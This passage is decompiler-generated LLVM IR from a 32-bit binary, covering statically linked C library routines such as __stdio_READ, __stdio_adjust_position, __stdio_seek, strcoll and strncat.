  store i32 %v0_80561a2, i32* %v3_80561a2, align 4
  %v0_80561a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80561a5 = load i32, i32* @esi, align 4
  %v2_80561a5 = add i32 %v1_80561a5, 28
  %v3_80561a5 = inttoptr i32 %v2_80561a5 to i32*
  store i32 %v0_80561a5, i32* %v3_80561a5, align 4
  %v0_80561a8 = load i32, i32* @esi, align 4
  %v1_80561a8 = add i32 %v0_80561a8, 44
  %v2_80561a8 = inttoptr i32 %v1_80561a8 to i32*
  store i32 0, i32* %v2_80561a8, align 4
  %v0_80561af = load i32, i32* @esi, align 4
  %v1_80561af = add i32 %v0_80561af, 2
  %v2_80561af = inttoptr i32 %v1_80561af to i8*
  store i8 0, i8* %v2_80561af, align 1
  br label %dec_label_pc_80561b8

dec_label_pc_80561b5:                             ; preds = %dec_label_pc_805617f, %dec_label_pc_805616b, %dec_label_pc_8056156
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80561b8

dec_label_pc_80561b8:                             ; preds = %dec_label_pc_8056193, %dec_label_pc_80561b5
  br i1 %v1_8056130, label %dec_label_pc_80561cd, label %dec_label_pc_80561bc

dec_label_pc_80561bc:                             ; preds = %dec_label_pc_80561b8
  %v2_80561c0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80561c0, i32* @eax, align 4
  %v3_80561c5 = call i32 @__pthread_return_void(i32 %v2_80561c0, i32 1)
  store i32 %v3_80561c5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80561cd

dec_label_pc_80561cd:                             ; preds = %dec_label_pc_80561b8, %dec_label_pc_8056118, %dec_label_pc_80561bc
  %v0_80561d0 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80561d0, i32* %eax.global-to-local, align 4
  store i32 %v0_80560f7, i32* @ebx, align 4
  store i32 %v0_80560f6, i32* @esi, align 4
  store i32 %v0_80560f5, i32* @edi, align 4
  store i32 %v0_80560f4, i32* @ebp, align 4
  ret i32 %v0_80561d0

; uselistorder directives
  uselistorder i32 %v2_8056181.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8056166, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 29, 16, 15, 14, 13, 12, 11, 10, 3, 28, 33, 32, 8, 2, 1, 0, 6, 31, 5, 9, 22, 21, 20, 24, 23, 30, 19, 7, 4, 18, 17, 27, 26, 25 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 51, 50, 47, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 1, 0, 49, 48, 59, 58, 57, 56, 9, 8, 5, 4, 55, 54, 3, 2, 11, 10, 36, 35, 34, 33, 32, 31, 40, 39, 38, 37, 53, 52, 30, 29, 7, 6, 28, 27, 26, 25, 46, 45, 44, 43, 42, 41 }
  uselistorder i32 134562611, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 14, 15, 16, 17, 18, 23, 24, 25, 26, 19 }
  uselistorder i32 52, { 8, 2, 13, 1, 3, 4, 5, 14, 15, 6, 11, 7, 9, 16, 12, 10, 0 }
  uselistorder i32 22, { 8, 15, 3, 4, 5, 6, 11, 14, 13, 9, 10, 12, 16, 7, 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80561cd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80561b8, { 1, 0 }
  uselistorder label %dec_label_pc_805617f, { 1, 0 }
  uselistorder label %dec_label_pc_8056151, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80561d8 = load i32, i32* @ebx, align 4
  store i32 %v0_80561d8, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_80561de = ptrtoint i16* %arg1 to i32
  store i32 %v4_80561de, i32* @ebx, align 4
  %v1_80561e6 = bitcast i16* %arg1 to i8*
  %v2_80561e6 = load i8, i8* %v1_80561e6, align 1
  %v3_80561e6 = and i8 %v2_80561e6, 4
  %v4_80561e6 = icmp eq i8 %v3_80561e6, 0
  %v1_80561e9 = icmp eq i1 %v4_80561e6, false
  br i1 %v1_80561e9, label %dec_label_pc_8056218, label %dec_label_pc_80561eb

dec_label_pc_80561eb:                             ; preds = %entry
  %v2_80561eb = icmp slt i32 %arg3, 0
  %v1_80561ed = icmp eq i1 %v2_80561eb, false
  br i1 %v1_80561ed, label %dec_label_pc_80561f4, label %dec_label_pc_80561ef

dec_label_pc_80561ef:                             ; preds = %dec_label_pc_80561eb
  br label %dec_label_pc_80561f4

dec_label_pc_80561f4:                             ; preds = %dec_label_pc_80561eb, %dec_label_pc_80561ef
  %v0_80561f5 = phi i32 [ %arg3, %dec_label_pc_80561eb ], [ 2147483647, %dec_label_pc_80561ef ]
  %v1_80561fa = add i32 %v4_80561de, 4
  %v2_80561fa = inttoptr i32 %v1_80561fa to i32*
  %v3_80561fa = load i32, i32* %v2_80561fa, align 4
  %v3_80561fd = inttoptr i32 %arg2 to i32*
  %v4_80561fd = call i32 @__libc_read(i32 %v3_80561fa, i32* %v3_80561fd, i32 %v0_80561f5)
  store i32 %v4_80561fd, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_80561fd, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8056218, label %dec_label_pc_805620a

dec_label_pc_805620a:                             ; preds = %dec_label_pc_80561f4
  %v1_8056205 = icmp eq i32 %v4_80561fd, 0
  %v4_8056208 = icmp eq i1 %v1_8056205, false
  %v0_8056212 = load i32, i32* @ebx, align 4
  %v1_8056212 = inttoptr i32 %v0_8056212 to i16*
  %v2_8056212 = load i16, i16* %v1_8056212, align 2
  br i1 %v4_8056208, label %dec_label_pc_8056212, label %dec_label_pc_805620c

dec_label_pc_805620c:                             ; preds = %dec_label_pc_805620a
  %v3_805620c = or i16 %v2_8056212, 4
  store i16 %v3_805620c, i16* %v1_8056212, align 2
  %v0_805621b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056218

dec_label_pc_8056212:                             ; preds = %dec_label_pc_805620a
  %v3_8056212 = or i16 %v2_8056212, 8
  store i16 %v3_8056212, i16* %v1_8056212, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056218

dec_label_pc_8056218:                             ; preds = %dec_label_pc_80561f4, %entry, %dec_label_pc_805620c, %dec_label_pc_8056212
  %v0_805621b = phi i32 [ %v4_80561fd, %dec_label_pc_80561f4 ], [ 0, %entry ], [ %v0_805621b.pre, %dec_label_pc_805620c ], [ 0, %dec_label_pc_8056212 ]
  %v2_805621a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805621a, i32* @ebx, align 4
  ret i32 %v0_805621b

; uselistorder directives
  uselistorder i16 %v2_8056212, { 1, 0 }
  uselistorder i32 %v4_80561fd, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056218, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_80561f4, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_805622c = load i32, i32* %arg1, align 4
  store i32 %v2_805622c, i32* %esi.global-to-local, align 4
  %v1_8056233 = urem i32 %v2_805622c, 4
  %v2_8056233 = icmp eq i32 %v1_8056233, 0
  store i32 %v1_8056233, i32* %ecx.global-to-local, align 4
  br i1 %v2_8056233, label %dec_label_pc_8056262, label %dec_label_pc_8056238

dec_label_pc_8056238:                             ; preds = %entry
  %v1_805623a = add nsw i32 %v1_8056233, -1
  %v8_805623a = icmp eq i32 %v1_805623a, 0
  store i32 %v1_805623a, i32* @edx, align 4
  br i1 %v8_805623a, label %dec_label_pc_8056262, label %dec_label_pc_805623d

dec_label_pc_805623d:                             ; preds = %dec_label_pc_8056238
  %v3_805623d = and i32 %v2_805622c, 2048
  %v4_805623d = icmp eq i32 %v3_805623d, 0
  br i1 %v4_805623d, label %dec_label_pc_8056262, label %dec_label_pc_8056242

dec_label_pc_8056242:                             ; preds = %dec_label_pc_805623d
  %v6_8056242 = sub nsw i32 1, %v1_8056233
  %v7_8056242 = and i32 %v1_805623a, %v6_8056242
  %v8_8056242 = icmp slt i32 %v7_8056242, 0
  %v9_8056242 = icmp eq i32 %v1_8056233, 2
  %v10_8056242 = icmp ult i32 %v1_8056233, 2
  %v3_8056245 = icmp eq i1 %v10_8056242, %v8_8056242
  %v4_8056245 = icmp eq i1 %v9_8056242, false
  %v5_8056245 = and i1 %v4_8056245, %v3_8056245
  br i1 %v5_8056245, label %dec_label_pc_80562b8, label %dec_label_pc_8056247

dec_label_pc_8056247:                             ; preds = %dec_label_pc_8056242
  %v1_8056247 = add i32 %tmp6, 40
  %v2_8056247 = inttoptr i32 %v1_8056247 to i32*
  %v3_8056247 = load i32, i32* %v2_8056247, align 4
  %v4_8056247 = icmp eq i32 %v3_8056247, 0
  %v1_805624b = icmp eq i1 %v4_8056247, false
  br i1 %v1_805624b, label %dec_label_pc_80562b8, label %dec_label_pc_805624d

dec_label_pc_805624d:                             ; preds = %dec_label_pc_8056247
  %v1_805624d = add i32 %tmp6, 3
  %v2_805624d = inttoptr i32 %v1_805624d to i8*
  %v3_805624d = load i8, i8* %v2_805624d, align 1
  %v4_805624d = zext i8 %v3_805624d to i32
  %v2_8056251 = sub nsw i32 %v1_805623a, %v4_805624d
  %v1_8056253 = add i32 %tmp6, 44
  %v2_8056253 = inttoptr i32 %v1_8056253 to i32*
  %v3_8056253 = load i32, i32* %v2_8056253, align 4
  %v1_8056257 = add nsw i32 %v2_8056251, -1
  %tmp12 = icmp slt i32 %v3_8056253, 1
  br i1 %tmp12, label %dec_label_pc_8056262, label %dec_label_pc_805625c

dec_label_pc_805625c:                             ; preds = %dec_label_pc_805624d
  %v1_805625c = add i32 %tmp6, 2
  %v2_805625c = inttoptr i32 %v1_805625c to i8*
  %v3_805625c = load i8, i8* %v2_805625c, align 1
  %v4_805625c = zext i8 %v3_805625c to i32
  %v2_8056260 = sub nsw i32 %v1_8056257, %v4_805625c
  br label %dec_label_pc_8056262

dec_label_pc_8056262:                             ; preds = %dec_label_pc_805624d, %dec_label_pc_805623d, %dec_label_pc_8056238, %entry, %dec_label_pc_805625c
  %v0_8056279 = phi i32 [ %v1_8056257, %dec_label_pc_805624d ], [ %v1_805623a, %dec_label_pc_805623d ], [ 0, %dec_label_pc_8056238 ], [ 0, %entry ], [ %v2_8056260, %dec_label_pc_805625c ]
  %v2_8056262 = and i32 %v2_805622c, 64
  %v3_8056262 = icmp eq i32 %v2_8056262, 0
  %storemerge.in.in.v = select i1 %v3_8056262, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8056271 = add i32 %tmp6, 16
  %v3_8056271 = inttoptr i32 %v2_8056271 to i32*
  %v4_8056271 = load i32, i32* %v3_8056271, align 4
  %v5_8056271 = sub i32 %storemerge, %v4_8056271
  %v1_8056274 = inttoptr i32 %arg2 to i32*
  %v2_8056274 = load i32, i32* %v1_8056274, align 4
  store i32 %v2_8056274, i32* %ecx.global-to-local, align 4
  %v1_8056276 = add i32 %arg2, 4
  %v2_8056276 = inttoptr i32 %v1_8056276 to i32*
  %v3_8056276 = load i32, i32* %v2_8056276, align 4
  store i32 %v3_8056276, i32* %ebx.global-to-local, align 4
  %v2_8056279 = add i32 %v5_8056271, %v0_8056279
  store i32 %v2_8056279, i32* %esi.global-to-local, align 4
  %v2_8056284 = ashr i32 %v2_8056279, 31
  %v5_805628d = sub i32 %v2_8056274, %v2_8056279
  %v10_805628d = icmp ult i32 %v2_8056274, %v2_8056279
  %v6_8056291 = zext i1 %v10_805628d to i32
  %tmp = icmp slt i32 %v2_8056279, 0
  %v2_8056284.neg = zext i1 %tmp to i32
  %v7_8056291 = add i32 %v3_8056276, %v2_8056284.neg
  %v8_8056291 = add i32 %v7_8056291, %v6_8056291
  store i32 %v8_8056291, i32* @edx, align 4
  store i32 %v5_805628d, i32* %v1_8056274, align 4
  %v0_8056297 = load i32, i32* @edx, align 4
  %v1_8056297 = load i32, i32* %edi.global-to-local, align 4
  %v2_8056297 = add i32 %v1_8056297, 4
  %v3_8056297 = inttoptr i32 %v2_8056297 to i32*
  store i32 %v0_8056297, i32* %v3_8056297, align 4
  %v0_805629a = load i32, i32* %edi.global-to-local, align 4
  %v1_805629a = add i32 %v0_805629a, 4
  %v2_805629a = inttoptr i32 %v1_805629a to i32*
  %v3_805629a = load i32, i32* %v2_805629a, align 4
  %v4_805629a = load i32, i32* %ebx.global-to-local, align 4
  %v5_805629d = icmp slt i32 %v3_805629a, %v4_805629a
  br i1 %v5_805629d, label %dec_label_pc_80562a7, label %dec_label_pc_805629f

dec_label_pc_805629f:                             ; preds = %dec_label_pc_8056262
  %v8_805629f = icmp sgt i32 %v3_805629a, %v4_805629a
  br i1 %v8_805629f, label %dec_label_pc_80562a5, label %dec_label_pc_80562a1

dec_label_pc_80562a1:                             ; preds = %dec_label_pc_805629f
  %v1_80562a1 = inttoptr i32 %v0_805629a to i32*
  %v2_80562a1 = load i32, i32* %v1_80562a1, align 4
  %v3_80562a1 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80562a1, %v3_80562a1
  br i1 %tmp14, label %dec_label_pc_80562a5, label %dec_label_pc_80562a7

dec_label_pc_80562a5:                             ; preds = %dec_label_pc_80562a1, %dec_label_pc_805629f
  %v0_80562a5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80562a5 = sub i32 0, %v0_80562a5
  store i32 %v1_80562a5, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80562a7

dec_label_pc_80562a7:                             ; preds = %dec_label_pc_80562a1, %dec_label_pc_8056262, %dec_label_pc_80562a5
  %v0_80562a7 = load i32, i32* %esi.global-to-local, align 4
  %v2_80562a7 = icmp slt i32 %v0_80562a7, 0
  %v1_80562a9 = icmp eq i1 %v2_80562a7, false
  br i1 %v1_80562a9, label %dec_label_pc_80562bb, label %dec_label_pc_80562ab

dec_label_pc_80562ab:                             ; preds = %dec_label_pc_80562a7
  %v1_80562ab = call i32 @__errno_location(i32 %v2_8056284)
  %v1_80562b0 = inttoptr i32 %v1_80562ab to i32*
  store i32 75, i32* %v1_80562b0, align 4
  %v0_80562be.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80562bb

dec_label_pc_80562b8:                             ; preds = %dec_label_pc_8056247, %dec_label_pc_8056242
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80562bb

dec_label_pc_80562bb:                             ; preds = %dec_label_pc_80562a7, %dec_label_pc_80562ab, %dec_label_pc_80562b8
  %v0_80562be = phi i32 [ %v0_80562a7, %dec_label_pc_80562a7 ], [ %v0_80562be.pre, %dec_label_pc_80562ab ], [ -1, %dec_label_pc_80562b8 ]
  ret i32 %v0_80562be

; uselistorder directives
  uselistorder i32 %v4_805629a, { 1, 0 }
  uselistorder i32 %v3_805629a, { 1, 0 }
  uselistorder i32 %v1_805623a, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_8056233, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_805622c, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5, 6 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80562bb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80562a7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056262, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80562c4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80562cc = add i32 %arg1, 8
  %v2_80562cc = inttoptr i32 %v1_80562cc to i32*
  %v3_80562cc = load i32, i32* %v2_80562cc, align 4
  store i32 %v3_80562cc, i32* %edx.global-to-local, align 4
  %v1_80562cf = add i32 %arg1, 12
  %v2_80562cf = inttoptr i32 %v1_80562cf to i32*
  %v3_80562cf = load i32, i32* %v2_80562cf, align 4
  %v2_80562d2 = sub i32 %v3_80562cf, %v3_80562cc
  %v3_80562d7 = inttoptr i32 %arg1 to i16*
  %v4_80562d7 = call i32 @__stdio_READ(i16* %v3_80562d7, i32 %v3_80562cc, i32 %v2_80562d2)
  %v0_80562dc = load i32, i32* @ebx, align 4
  %v1_80562dc = add i32 %v0_80562dc, 8
  %v2_80562dc = inttoptr i32 %v1_80562dc to i32*
  %v3_80562dc = load i32, i32* %v2_80562dc, align 4
  store i32 %v3_80562dc, i32* %edx.global-to-local, align 4
  %v2_80562df = add i32 %v0_80562dc, 16
  %v3_80562df = inttoptr i32 %v2_80562df to i32*
  store i32 %v3_80562dc, i32* %v3_80562df, align 4
  %v0_80562e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80562e2 = add i32 %v0_80562e2, %v4_80562d7
  store i32 %v2_80562e2, i32* %edx.global-to-local, align 4
  %v1_80562e4 = load i32, i32* @ebx, align 4
  %v2_80562e4 = add i32 %v1_80562e4, 20
  %v3_80562e4 = inttoptr i32 %v2_80562e4 to i32*
  store i32 %v2_80562e2, i32* %v3_80562e4, align 4
  store i32 %v0_80562c4, i32* @ebx, align 4
  ret i32 %v4_80562d7

; uselistorder directives
  uselistorder i32 %v4_80562d7, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80562ec = load i32, i32* @ebx, align 4
  %v4_80562f0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80562f0, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80562f8 = bitcast i16* %arg1 to i32*
  %v2_80562f8 = load i32, i32* %v1_80562f8, align 4
  %v1_80562fa = urem i32 %v2_80562f8, 65536
  %v2_80562fd = and i32 %v1_80562fa, %arg2
  %v3_80562fd = icmp eq i32 %v2_80562fd, 0
  %v1_80562ff = icmp eq i1 %v3_80562fd, false
  br i1 %v1_80562ff, label %dec_label_pc_805630e, label %dec_label_pc_8056301

dec_label_pc_8056301:                             ; preds = %entry
  %v1_8056301 = and i32 %v2_80562f8, 2176
  %v2_8056301 = icmp eq i32 %v1_8056301, 0
  %v1_8056307 = icmp eq i1 %v2_8056301, false
  br i1 %v1_8056307, label %dec_label_pc_8056315, label %dec_label_pc_8056309

dec_label_pc_8056309:                             ; preds = %dec_label_pc_8056301
  %v2_8056309 = or i32 %v2_80562f8, %arg2
  %v1_805630b = trunc i32 %v2_8056309 to i16
  store i16 %v1_805630b, i16* %arg1, align 2
  %v0_805630e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805630e

dec_label_pc_805630e:                             ; preds = %entry, %dec_label_pc_8056309
  %v0_8056330 = phi i32 [ %v4_80562f0, %entry ], [ %v0_805630e.pre, %dec_label_pc_8056309 ]
  %v1_805630e = inttoptr i32 %v0_8056330 to i16*
  %v2_805630e = load i16, i16* %v1_805630e, align 2
  %v2_8056311 = and i16 %v2_805630e, 16
  %v3_8056311 = icmp eq i16 %v2_8056311, 0
  br i1 %v3_8056311, label %dec_label_pc_8056329, label %dec_label_pc_8056315

dec_label_pc_8056315:                             ; preds = %dec_label_pc_805630e, %dec_label_pc_8056301
  %v1_8056315 = call i32 @__errno_location(i32 %v0_80562ec)
  %v1_805631a = inttoptr i32 %v1_8056315 to i32*
  store i32 9, i32* %v1_805631a, align 4
  br label %dec_label_pc_8056320

dec_label_pc_8056320:                             ; preds = %dec_label_pc_805632d, %dec_label_pc_8056315
  %v0_8056320 = load i32, i32* @ebx, align 4
  %v1_8056320 = inttoptr i32 %v0_8056320 to i16*
  %v2_8056320 = load i16, i16* %v1_8056320, align 2
  %v3_8056320 = or i16 %v2_8056320, 8
  store i16 %v3_8056320, i16* %v1_8056320, align 2
  br label %dec_label_pc_805634d

dec_label_pc_8056329:                             ; preds = %dec_label_pc_805630e
  %v2_8056329 = and i16 %v2_805630e, 64
  %v3_8056329 = icmp eq i16 %v2_8056329, 0
  br i1 %v3_8056329, label %dec_label_pc_8056347, label %dec_label_pc_805632d

dec_label_pc_805632d:                             ; preds = %dec_label_pc_8056329
  %v2_8056331 = call i32 @__stdio_wcommit(i32 %v0_8056330)
  %v1_8056339 = icmp eq i32 %v2_8056331, 0
  %v1_805633b = icmp eq i1 %v1_8056339, false
  br i1 %v1_805633b, label %dec_label_pc_8056320, label %dec_label_pc_805633d

dec_label_pc_805633d:                             ; preds = %dec_label_pc_805632d
  %v0_805633d = load i32, i32* @ebx, align 4
  %v1_805633d = inttoptr i32 %v0_805633d to i16*
  %v2_805633d = load i16, i16* %v1_805633d, align 2
  %v3_805633d = and i16 %v2_805633d, -65
  store i16 %v3_805633d, i16* %v1_805633d, align 2
  %v0_8056341 = load i32, i32* @ebx, align 4
  %v1_8056341 = add i32 %v0_8056341, 8
  %v2_8056341 = inttoptr i32 %v1_8056341 to i32*
  %v3_8056341 = load i32, i32* %v2_8056341, align 4
  %v2_8056344 = add i32 %v0_8056341, 28
  %v3_8056344 = inttoptr i32 %v2_8056344 to i32*
  store i32 %v3_8056341, i32* %v3_8056344, align 4
  %v0_8056347.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8056347

dec_label_pc_8056347:                             ; preds = %dec_label_pc_8056329, %dec_label_pc_805633d
  %v9_8056347 = phi i32 [ %v0_8056330, %dec_label_pc_8056329 ], [ %v0_8056347.pre, %dec_label_pc_805633d ]
  %v1_8056347 = inttoptr i32 %v9_8056347 to i16*
  %v2_8056347 = load i16, i16* %v1_8056347, align 2
  %v3_8056347 = or i16 %v2_8056347, 1
  store i16 %v3_8056347, i16* %v1_8056347, align 2
  br label %dec_label_pc_805634d

dec_label_pc_805634d:                             ; preds = %dec_label_pc_8056320, %dec_label_pc_8056347
  %storemerge = phi i32 [ 0, %dec_label_pc_8056347 ], [ -1, %dec_label_pc_8056320 ]
  store i32 %v0_80562ec, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80562f8, { 1, 2, 0 }
  uselistorder i32 %v0_80562ec, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 8, { 3, 4, 0, 1, 5, 2 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805634d, { 1, 0 }
  uselistorder label %dec_label_pc_8056347, { 1, 0 }
  uselistorder label %dec_label_pc_805630e, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056360 = add i32 %tmp5, 4
  %v2_8056360 = inttoptr i32 %v1_8056360 to i32*
  %v3_8056360 = load i32, i32* %v2_8056360, align 4
  %v2_8056363 = load i32, i32* %arg2, align 4
  %v1_8056369 = add i32 %arg1, 4
  %v2_8056369 = inttoptr i32 %v1_8056369 to i32*
  %v3_8056369 = load i32, i32* %v2_8056369, align 4
  %v4_805636c = call i32 @__libc_lseek64(i32 %v3_8056369, i32 %v2_8056363, i32 %v3_8056360, i32 %arg3)
  %v0_8056376 = load i32, i32* @edx, align 4
  %v2_8056376 = icmp slt i32 %v0_8056376, 0
  br i1 %v2_8056376, label %dec_label_pc_8056381, label %dec_label_pc_805637a

dec_label_pc_805637a:                             ; preds = %entry
  %v1_805637a = load i32, i32* @ebx, align 4
  %v2_805637a = inttoptr i32 %v1_805637a to i32*
  store i32 %v4_805636c, i32* %v2_805637a, align 4
  %v0_805637c = load i32, i32* @edx, align 4
  %v1_805637c = load i32, i32* @ebx, align 4
  %v2_805637c = add i32 %v1_805637c, 4
  %v3_805637c = inttoptr i32 %v2_805637c to i32*
  store i32 %v0_805637c, i32* %v3_805637c, align 4
  br label %dec_label_pc_8056381

dec_label_pc_8056381:                             ; preds = %entry, %dec_label_pc_805637a
  %v0_8056381 = phi i32 [ %v4_805636c, %entry ], [ 0, %dec_label_pc_805637a ]
  ret i32 %v0_8056381

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8056381, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805638a = ptrtoint i8* %arg1 to i32
  %v4_8056392.pre = load i32, i32* @eax, align 4
  %v8_8056392.pre = load i1, i1* @df, align 1
  %v9_8056392 = select i1 %v8_8056392.pre, i32 -1, i32 1
  br label %dec_label_pc_8056392

dec_label_pc_8056392:                             ; preds = %dec_label_pc_8056396, %entry
  %v20_8056393 = phi i32 [ %v23_8056393, %dec_label_pc_8056396 ], [ %arg2, %entry ]
  %v4_8056392 = phi i32 [ %v6_8056392, %dec_label_pc_8056396 ], [ %v4_8056392.pre, %entry ]
  %v7_8056392 = phi i32 [ %v10_8056392, %dec_label_pc_8056396 ], [ %v4_805638a, %entry ]
  %v1_8056392 = inttoptr i32 %v7_8056392 to i8*
  %v2_8056392 = load i8, i8* %v1_8056392, align 1
  %v3_8056393 = inttoptr i32 %v20_8056393 to i8*
  %v4_8056393 = load i8, i8* %v3_8056393, align 1
  %v15_8056393 = icmp eq i8 %v2_8056392, %v4_8056393
  %v1_8056394 = icmp eq i1 %v15_8056393, false
  br i1 %v1_8056394, label %dec_label_pc_805639e, label %dec_label_pc_8056396

dec_label_pc_8056396:                             ; preds = %dec_label_pc_8056392
  %v3_8056392 = zext i8 %v2_8056392 to i32
  %v5_8056392 = and i32 %v4_8056392, -256
  %v6_8056392 = or i32 %v3_8056392, %v5_8056392
  %v23_8056393 = add i32 %v20_8056393, %v9_8056392
  %v10_8056392 = add i32 %v7_8056392, %v9_8056392
  %v4_8056396 = icmp eq i8 %v2_8056392, 0
  %v1_8056398 = icmp eq i1 %v4_8056396, false
  br i1 %v1_8056398, label %dec_label_pc_8056392, label %dec_label_pc_80563a2

dec_label_pc_805639e:                             ; preds = %dec_label_pc_8056392
  br label %dec_label_pc_80563a2

dec_label_pc_80563a2:                             ; preds = %dec_label_pc_8056396, %dec_label_pc_805639e
  %storemerge = phi i32 [ 1, %dec_label_pc_805639e ], [ 0, %dec_label_pc_8056396 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8056392, { 1, 2, 0 }
  uselistorder i32 %v9_8056392, { 1, 0 }
  uselistorder label %dec_label_pc_80563a2, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80563a9 = load i32, i32* @esi, align 4
  store i32 %v0_80563a9, i32* %stack_var_-8, align 4
  %v4_80563aa = ptrtoint i8* %tmp5 to i32
  store i32 %v4_80563aa, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_80563b7 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_80563bb = call i32 @_strlen(i8* %v4_80563b7)
  %v2_80563bd = add i32 %tmp, -1
  store i32 %v2_80563bd, i32* %edi.global-to-local, align 4
  %v0_80563be = load i32, i32* %edx.global-to-local, align 4
  %v8_80563c110 = icmp eq i32 %v0_80563be, 0
  store i32 %v0_80563be, i32* %ecx.global-to-local, align 4
  br i1 %v8_80563c110, label %dec_label_pc_80563cc, label %dec_label_pc_80563c4.lr.ph

dec_label_pc_80563c4.lr.ph:                       ; preds = %entry
  %v4_80563c4.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_80563c4.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80563c4

dec_label_pc_80563c4:                             ; preds = %dec_label_pc_80563c4.lr.ph, %dec_label_pc_80563c4.dec_label_pc_80563c1_crit_edge
